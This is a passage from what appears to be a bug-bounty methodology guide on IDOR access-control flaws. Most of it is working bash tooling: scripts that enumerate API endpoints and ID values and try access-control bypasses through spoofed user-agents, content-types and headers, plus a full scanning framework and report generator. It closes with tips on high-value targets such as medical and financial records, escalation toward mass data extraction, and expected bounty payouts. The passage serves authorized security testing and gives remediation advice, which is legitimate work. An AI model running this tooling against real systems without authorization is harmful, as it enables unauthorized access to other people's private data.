        
        base_payload='{"id": "'$id'", "action": "view"}'
        
        for content_type in "${content_types[@]}"; do
            echo "Testing content-type: $content_type"
            
            response=$(curl -s -X POST \
                -H "Content-Type: $content_type" \
                -d "$base_payload" \
                "$target$endpoint" \
                -w "HTTPCODE:%{http_code}|SIZE:%{size_download}")
            
            http_code=$(echo "$response" | grep -o "HTTPCODE:[0-9]*" | cut -d: -f2)
            size=$(echo "$response" | grep -o "SIZE:[0-9]*" | cut -d: -f2)
            
            if [[ "$http_code" == "200" && "$size" -gt 50 ]]; then
                echo "✅ Content-type bypass IDOR: $content_type"
                echo "$target$endpoint|$content_type|$http_code|$size|$(date)" >> content_type_bypass_idor.txt
            fi
            
            sleep 0.3
        done
    }
    
    # Test user-agent bypass
    test_user_agent_bypass() {
        local endpoint=$1
        local id=$2
        
        echo "🤖 Testing user-agent bypass for $endpoint/$id"
        
        # User agents that might bypass restrictions
        user_agents=(
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
            "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
            "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
            "Twitterbot/1.0"
            "LinkedInBot/1.0 (compatible; Mozilla/5.0; Apache-HttpClient +http://www.linkedin.com/)"
            "curl/7.68.0"
            "Wget/1.20.3"
            "PostmanRuntime/7.26.8"
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
            "Internal-System-Bot"
            "Admin-Tool/1.0"
            "Monitoring-Service"
        )
        
        for user_agent in "${user_agents[@]}"; do
            echo "Testing User-Agent: $user_agent"
            
            response=$(curl -s -X GET \
                -H "User-Agent: $user_agent" \
                "$target$endpoint/$id" \
                -w "HTTPCODE:%{http_code}|SIZE:%{size_download}")
            
            http_code=$(echo "$response" | grep -o "HTTPCODE:[0-9]*" | cut -d: -f2)
            size=$(echo "$response" | grep -o "SIZE:[0-9]*" | cut -d: -f2)
            
            if [[ "$http_code" == "200" && "$size" -gt 100 ]]; then
                echo "✅ User-Agent bypass IDOR: $user_agent"
                echo "$target$endpoint/$id|$user_agent|$http_code|$size|$(date)" >> user_agent_bypass_idor.txt
            fi
            
            sleep 0.3
        done
    }
    
    # Test bypass techniques on common endpoints
    bypass_test_endpoints=("/api/user" "/api/document" "/api/file")
    bypass_test_ids=(1 2 5 10)
    
    for endpoint in "${bypass_test_endpoints[@]}"; do
        for id in "${bypass_test_ids[@]}"; do
            echo "🎯 Testing bypass techniques on $endpoint/$id"
            
            test_header_bypass "$endpoint" "$id"
            test_path_manipulation "$endpoint" "$id"
            test_content_type_bypass "$endpoint" "$id"
            test_user_agent_bypass "$endpoint" "$id"
            
            sleep 1
        done
    done
    
    cd ..
}
```

## 🚀 Phase 4: Comprehensive IDOR Testing Framework

### Method 1: Complete IDOR Assessment Tool
```bash
#!/bin/bash
# Complete IDOR assessment framework
# Save as complete_idor_tester.sh

TARGET=$1
if [ -z "$TARGET" ]; then
    echo "Usage: ./complete_idor_tester.sh https://target.com"
    exit 1
fi

echo "🔍 Complete IDOR Assessment Framework - Starting comprehensive scan for $TARGET"
echo "=============================================================================="

# Create working directory
WORK_DIR="idor_assessment_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$WORK_DIR"
cd "$WORK_DIR"

# Phase 1: Endpoint Discovery
echo "🔍 Phase 1: IDOR-vulnerable endpoint discovery..."

discover_idor_endpoints() {
    echo "📊 Discovering potential IDOR endpoints..."
    
    # Comprehensive list of IDOR-prone endpoints
    potential_endpoints=(
        # User-related endpoints
        "/api/user" "/api/users" "/api/profile" "/api/account" "/api/member"
        "/user" "/users" "/profile" "/account" "/member"
        
        # Document/File endpoints
        "/api/document" "/api/documents" "/api/file" "/api/files" "/api/attachment"
        "/document" "/documents" "/file" "/files" "/attachment"
        
        # Transaction/Order endpoints
        "/api/order" "/api/orders" "/api/transaction" "/api/transactions" "/api/invoice"
        "/order" "/orders" "/transaction" "/transactions" "/invoice"
        
        # Message/Communication endpoints
        "/api/message" "/api/messages" "/api/conversation" "/api/chat"
        "/message" "/messages" "/conversation" "/chat"
        
        # Admin endpoints
        "/api/admin/user" "/api/admin/users" "/api/admin/account"
        "/admin/user" "/admin/users" "/admin/account"
        
        # Other common endpoints
        "/api/post" "/api/posts" "/api/comment" "/api/comments"
        "/api/report" "/api/reports" "/api/log" "/api/logs"
    )
    
    available_endpoints=()
    
    for endpoint in "${potential_endpoints[@]}"; do
        # Test with a common ID to see if endpoint exists
        response=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET$endpoint/1")
        
        if [[ "$response" != "404" ]]; then
            echo "✅ Found potential IDOR endpoint: $endpoint (HTTP $response)"
            available_endpoints+=("$endpoint")
        fi
        
        sleep 0.1
    done
    
    echo "📊 Found ${#available_endpoints[@]} potential IDOR endpoints"
    printf '%s
' "${available_endpoints[@]}" > available_idor_endpoints.txt
}

discover_idor_endpoints

# Phase 2: Comprehensive IDOR Testing
echo "🧪 Phase 2: Comprehensive IDOR testing..."

# Load discovered endpoints
if [[ -f available_idor_endpoints.txt ]]; then
    while read endpoint; do
        echo "🎯 Testing IDOR on endpoint: $endpoint"
        
        # Run all IDOR testing methods
        ../advanced_idor_scanner.sh "$TARGET" "$endpoint"
        parameter_idor_tester "$TARGET" "$endpoint"
        advanced_idor_enumeration "$TARGET" "$endpoint"
        blind_idor_detection "$TARGET" "$endpoint"
        http_method_idor_testing "$TARGET" "$endpoint"
        advanced_idor_bypass "$TARGET" "$endpoint"
        
        sleep 2
    done < available_idor_endpoints.txt
fi

# Phase 3: Results Analysis and Reporting
echo "📊 Phase 3: Results analysis and comprehensive reporting..."

generate_idor_assessment_report() {
    cat > idor_assessment_report.md << 'EOF'
# 🔍 IDOR (Insecure Direct Object Reference) Assessment Report

## 📋 Executive Summary
This report details the IDOR vulnerabilities discovered during the comprehensive security assessment.

## 🎯 Methodology
- Endpoint discovery and availability testing
- Numeric, UUID, encoded, and hashed IDOR testing
- Parameter-based IDOR testing (GET, POST, JSON)
- Advanced enumeration with predictable patterns
- Blind IDOR detection (timing, error-based, content-length)
- HTTP method-based IDOR testing
- Advanced bypass techniques (headers, path manipulation, content-type)

## 🔍 Findings Summary
EOF
    
    # Count findings from different test types
    total_idor=0
    
    if [[ -f numeric_idor_found.txt ]]; then
        numeric_count=$(wc -l < numeric_idor_found.txt)
        echo "- **Numeric IDOR Vulnerabilities:** $numeric_count" >> idor_assessment_report.md
        total_idor=$((total_idor + numeric_count))
    fi
    
    if [[ -f uuid_idor_found.txt ]]; then
        uuid_count=$(wc -l < uuid_idor_found.txt)
        echo "- **UUID IDOR Vulnerabilities:** $uuid_count" >> idor_assessment_report.md
        total_idor=$((total_idor + uuid_count))
    fi
    
    if [[ -f encoded_idor_found.txt ]]; then
        encoded_count=$(wc -l < encoded_idor_found.txt)
        echo "- **Encoded IDOR Vulnerabilities:** $encoded_count" >> idor_assessment_report.md
        total_idor=$((total_idor + encoded_count))
    fi
    
    if [[ -f get_parameter_idor.txt ]]; then
        get_param_count=$(wc -l < get_parameter_idor.txt)
        echo "- **GET Parameter IDOR:** $get_param_count" >> idor_assessment_report.md
        total_idor=$((total_idor + get_param_count))
    fi
    
    if [[ -f blind_idor_found.txt ]]; then
        blind_count=$(wc -l < blind_idor_found.txt)
        echo "- **Blind IDOR Vulnerabilities:** $blind_count" >> idor_assessment_report.md
        total_idor=$((total_idor + blind_count))
    fi
    
    if [[ -f method_based_idor.txt ]]; then
        method_count=$(wc -l < method_based_idor.txt)
        echo "- **HTTP Method-based IDOR:** $method_count" >> idor_assessment_report.md
        total_idor=$((total_idor + method_count))
    fi
    
    if [[ -f header_bypass_idor.txt ]]; then
        bypass_count=$(wc -l < header_bypass_idor.txt)
        echo "- **Bypass Technique IDOR:** $bypass_count" >> idor_assessment_report.md
        total_idor=$((total_idor + bypass_count))
    fi
    
    echo "- **Total IDOR Vulnerabilities:** $total_idor" >> idor_assessment_report.md
    
    # Add detailed findings
    cat >> idor_assessment_report.md << 'EOF'

## 🔥 Critical Findings

### 1. Numeric IDOR Vulnerabilities
EOF
    
    if [[ -f numeric_idor_found.txt ]]; then
        echo '```' >> idor_assessment_report.md
        head -20 numeric_idor_found.txt >> idor_assessment_report.md
        echo '```' >> idor_assessment_report.md
    fi
    
    cat >> idor_assessment_report.md << 'EOF'

### 2. Parameter-based IDOR Vulnerabilities
EOF
    
    if [[ -f get_parameter_idor.txt ]]; then
        echo '```' >> idor_assessment_report.md
        head -10 get_parameter_idor.txt >> idor_assessment_report.md
        echo '```' >> idor_assessment_report.md
    fi
    
    cat >> idor_assessment_report.md << 'EOF'

### 3. Blind IDOR Vulnerabilities
EOF
    
    if [[ -f blind_idor_found.txt ]]; then
        echo '```' >> idor_assessment_report.md
        head -10 blind_idor_found.txt >> idor_assessment_report.md
        echo '```' >> idor_assessment_report.md
    fi
    
    cat >> idor_assessment_report.md << 'EOF'

### 4. Advanced Bypass Techniques
EOF
    
    if [[ -f header_bypass_idor.txt ]]; then
        echo '```' >> idor_assessment_report.md
        head -10 header_bypass_idor.txt >> idor_assessment_report.md
        echo '```' >> idor_assessment_report.md
    fi
    
    cat >> idor_assessment_report.md << 'EOF'

## 🛠️ Remediation Recommendations

### Immediate Actions
1. **Implement Authorization Checks**: Verify user permissions for every object access
2. **Use Indirect References**: Replace direct object references with indirect references
3. **Session-based Access Control**: Implement proper session-based access controls
4. **Input Validation**: Validate all input parameters and object references
5. **Audit Logging**: Implement comprehensive audit logging for object access

### Long-term Improvements
1. **Access Control Matrix**: Implement a comprehensive access control matrix
2. **Regular Security Testing**: Conduct regular IDOR testing as part of security assessments
3. **Code Review**: Implement security-focused code review processes
4. **Developer Training**: Train developers on secure coding practices for object references
5. **Automated Testing**: Integrate IDOR testing into CI/CD pipelines

## 📊 Impact Assessment

- **Critical**: Access to sensitive user data, financial information, or admin functions
- **High**: Unauthorized access to user accounts, documents, or transactions
- **Medium**: Information disclosure, limited unauthorized access
- **Low**: Minor information leakage, non-sensitive data access

## 🔗 References

- OWASP Top 10 - Broken Access Control
- OWASP Testing Guide - IDOR Testing
- CWE-639: Authorization Bypass Through User-Controlled Key
- NIST Cybersecurity Framework
EOF
    
    echo "✅ Comprehensive IDOR assessment report generated: idor_assessment_report.md"
}

generate_idor_assessment_report

echo "✅ Complete IDOR Assessment completed!"
echo "📁 Results saved in: $WORK_DIR"
echo "📄 Report available: idor_assessment_report.md"

# Final summary
echo ""
echo "📊 FINAL SUMMARY:"
echo "================="
echo "Endpoints tested: $(wc -l < available_idor_endpoints.txt 2>/dev/null || echo 0)"
echo "Numeric IDOR: $(wc -l < numeric_idor_found.txt 2>/dev/null || echo 0)"
echo "UUID IDOR: $(wc -l < uuid_idor_found.txt 2>/dev/null || echo 0)"
echo "Encoded IDOR: $(wc -l < encoded_idor_found.txt 2>/dev/null || echo 0)"
echo "Parameter IDOR: $(wc -l < get_parameter_idor.txt 2>/dev/null || echo 0)"
echo "Blind IDOR: $(wc -l < blind_idor_found.txt 2>/dev/null || echo 0)"
echo "Method-based IDOR: $(wc -l < method_based_idor.txt 2>/dev/null || echo 0)"
echo "Bypass technique IDOR: $(wc -l < header_bypass_idor.txt 2>/dev/null || echo 0)"

cd ..
```

## 💡 Pro Tips for Maximum Impact

### 1. **High-Value IDOR Targets**
- User profile and account information
- Financial transactions and invoices
- Private documents and files
- Admin panels and management interfaces
- Personal messages and communications
- Medical records and sensitive data

### 2. **Common IDOR Patterns to Test**
- Sequential numeric IDs (1, 2, 3, ...)
- Predictable UUIDs or GUIDs
- Base64 encoded references
- Hashed object references
- Parameter-based object access
- Nested object references in JSON

### 3. **Advanced Detection Techniques**
- Timing-based blind IDOR detection
- Error message analysis
- Content-length comparison
- HTTP method enumeration
- Header-based bypass testing
- Path manipulation techniques

### 4. **Escalation Strategies**
- Chain IDOR with other vulnerabilities
- Target high-privilege accounts
- Focus on sensitive data access
- Test administrative functions
- Look for mass data extraction opportunities

## 🎯 Expected Bounty Range: $300 - $1500+

**Medium Impact ($300-600):**
- Basic user information IDOR
- Non-sensitive document access
- Limited data exposure

**High Impact ($600-1000):**
- Financial data IDOR
- Admin account access
- Sensitive document exposure
- Personal information access

**Critical Impact ($1000-1500+):**
- Mass user data access
- Financial transaction manipulation
- Complete admin panel access
- Medical/legal document exposure
- Critical business data access

## ⚠️ Legal Disclaimer
This methodology is for authorized security testing only. IDOR testing can expose sensitive user data and violate privacy. Always ensure you have proper permission and test only on systems you own or have explicit authorization to test.

---
**Created by Elite Bug Bounty Hunter | Follow responsible disclosure practices**
